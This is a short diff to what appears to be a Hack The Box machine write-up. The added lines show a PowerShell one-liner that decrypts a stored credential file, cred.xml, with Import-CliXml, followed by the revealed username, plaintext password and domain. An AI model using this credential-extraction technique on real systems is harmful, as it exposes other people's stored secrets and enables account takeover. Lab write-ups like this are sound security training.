@@ -388,3 +388,16 @@ cat cred.xml
 ```
 Found a file inside `nico` desktop called `cred.xml`
 
+Reference in the file is functions like 
+
+```python
+C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+UserName       : Tom
+Password       : 1ts-mag1c!!!
+SecurePassword : System.Security.SecureString
+Domain         : HTB
+```
+Found a password!
